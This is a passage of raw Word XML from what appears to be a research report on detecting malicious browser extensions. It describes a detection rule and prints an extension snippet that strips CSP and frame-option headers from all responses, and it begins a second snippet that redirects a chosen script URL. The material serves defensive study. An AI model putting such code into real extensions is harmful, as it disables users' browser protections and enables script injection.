                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>responseHeaders</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>]</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t>for</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t xml:space="preserve">var </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>n = t[</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"length"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>]-</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6897BB"/>
                        </w:rPr>
                        <w:t>1</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t xml:space="preserve">; </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>n&gt;=</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6897BB"/>
                        </w:rPr>
                        <w:t>0</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t xml:space="preserve">; </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>--n) {</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">        </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t xml:space="preserve">var </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>r = t[n][</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"name"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>][</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>toLowerCase</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>]()</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">        </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t>if</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t xml:space="preserve">(r == </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t xml:space="preserve">"X-frame-options" </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t xml:space="preserve">|| r == </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t xml:space="preserve">"Frame-options" </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t xml:space="preserve">|| </w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="0B545378" w14:textId="3CAE07AA" w:rsidR="006A6E3D" w:rsidRPr="00CA131F" w:rsidRDefault="006A6E3D" w:rsidP="00655814">
                      <w:pPr>
                        <w:pStyle w:val="HTMLPreformatted"/>
                        <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t xml:space="preserve">        r == </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t xml:space="preserve">"Content-security-policy" </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t xml:space="preserve">|| r == </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t xml:space="preserve">"X-content-security-policy" </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">        </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>||</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t xml:space="preserve">r == </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"X-</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>webkit</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>-</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>csp</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>) {</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">            t[</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"splice</w:t>
                      </w:r>
                      <w:proofErr w:type="gramStart"/>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>](</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>n</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t xml:space="preserve">, </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6897BB"/>
                        </w:rPr>
                        <w:t>1</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>)</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">        </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>}</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    }</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t xml:space="preserve">return </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>{</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">      </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="9876AA"/>
                        </w:rPr>
                        <w:t>responseHeaders</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>: t</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    }</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                        <w:t>}</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t xml:space="preserve">, </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>{</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">   </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="9876AA"/>
                        </w:rPr>
                        <w:t>urls</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>: [</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"*://*/*"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>]</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                        <w:t>}</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t xml:space="preserve">, </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>[</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"blocking"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t xml:space="preserve">, </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>responseHeaders</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>])</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="18B66AAD" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="00CA131F" w:rsidRDefault="006A6E3D" w:rsidP="00655814">
                      <w:pPr>
                        <w:pStyle w:val="HTMLPreformatted"/>
                        <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="76E91A80" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="00CA131F" w:rsidRDefault="006A6E3D">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00F66EC0" w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>Rule 4: HTTP response header security options.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="172"/>
    </w:p>
    <w:p w14:paraId="1EBD4BE1" w14:textId="10DEFF20" w:rsidR="001175B2" w:rsidRPr="009E02A4" w:rsidRDefault="009E02A4" w:rsidP="009E02A4">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="173" w:name="_Ref514844045"/>
      <w:bookmarkStart w:id="174" w:name="_Toc523071582"/>
      <w:r w:rsidRPr="009E02A4">
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="009E02A4">
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="006A6E3D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="009E02A4">
        <w:t>: HTTP response header security options.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="173"/>
      <w:bookmarkEnd w:id="174"/>
    </w:p>
    <w:p w14:paraId="5F14B7B3" w14:textId="77777777" w:rsidR="00F66EC0" w:rsidRPr="00F66EC0" w:rsidDel="00334F3E" w:rsidRDefault="00F66EC0" w:rsidP="001175B2">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:del w:id="175" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:43:00Z"/>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve">This rule detects malicious code used to remove security options from HTTP response header. It uses a listener to get all headers received and it checks for security options like </w:t>
      </w:r>
      <w:r w:rsidRPr="00334F3E">
        <w:rPr>
          <w:i/>
          <w:lang w:bidi="he-IL"/>
          <w:rPrChange w:id="176" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:43:00Z">
            <w:rPr>
              <w:lang w:bidi="he-IL"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>X-frame-options</w:t>
      </w:r>
      <w:r w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00334F3E">
        <w:rPr>
          <w:i/>
          <w:lang w:bidi="he-IL"/>
          <w:rPrChange w:id="177" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:43:00Z">
            <w:rPr>
              <w:lang w:bidi="he-IL"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>Frame-options</w:t>
      </w:r>
      <w:r w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00334F3E">
        <w:rPr>
          <w:i/>
          <w:lang w:bidi="he-IL"/>
          <w:rPrChange w:id="178" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:43:00Z">
            <w:rPr>
              <w:lang w:bidi="he-IL"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>Content-security-policy</w:t>
      </w:r>
      <w:r w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00334F3E">
        <w:rPr>
          <w:i/>
          <w:lang w:bidi="he-IL"/>
          <w:rPrChange w:id="179" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:43:00Z">
            <w:rPr>
              <w:lang w:bidi="he-IL"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>X-content-security-policy</w:t>
      </w:r>
      <w:r w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r w:rsidRPr="00334F3E">
        <w:rPr>
          <w:i/>
          <w:lang w:bidi="he-IL"/>
          <w:rPrChange w:id="180" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:43:00Z">
            <w:rPr>
              <w:lang w:bidi="he-IL"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>X-webkit-csp</w:t>
      </w:r>
      <w:r w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> to remove them.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D83A60" w14:textId="77777777" w:rsidR="00F66EC0" w:rsidRPr="00F66EC0" w:rsidDel="00334F3E" w:rsidRDefault="00F66EC0" w:rsidP="00F66EC0">
      <w:pPr>
        <w:rPr>
          <w:del w:id="181" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:43:00Z"/>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A444160" w14:textId="3C0408F2" w:rsidR="00F66EC0" w:rsidRDefault="00F66EC0" w:rsidP="00334F3E">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:pPrChange w:id="182" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:43:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49826C98" w14:textId="77777777" w:rsidR="007652E7" w:rsidRPr="00F66EC0" w:rsidRDefault="007652E7" w:rsidP="00F66EC0">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:bookmarkStart w:id="183" w:name="_Toc523071518"/>
    <w:p w14:paraId="078CEB2D" w14:textId="20B13051" w:rsidR="001175B2" w:rsidRDefault="00A87DC2" w:rsidP="00F66EC0">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251674624" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="580825A9" wp14:editId="76937D13">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>4445</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>365760</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="5991225" cy="1685925"/>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1685925"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="6B183178" w14:textId="55C8D0CC" w:rsidR="006A6E3D" w:rsidRPr="00655814" w:rsidRDefault="006A6E3D" w:rsidP="00655814">
                            <w:pPr>
                              <w:pStyle w:val="HTMLPreformatted"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>chrome.webRequest.onBeforeRequest.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="FFC66D"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>addListener</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>(</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">function </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>(details) {</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>if</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">(details.url == </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>"https://file you want to replace.js"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>) {</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">        </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">return </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>{</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">             </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="9876AA"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>redirectUrl</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">: </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
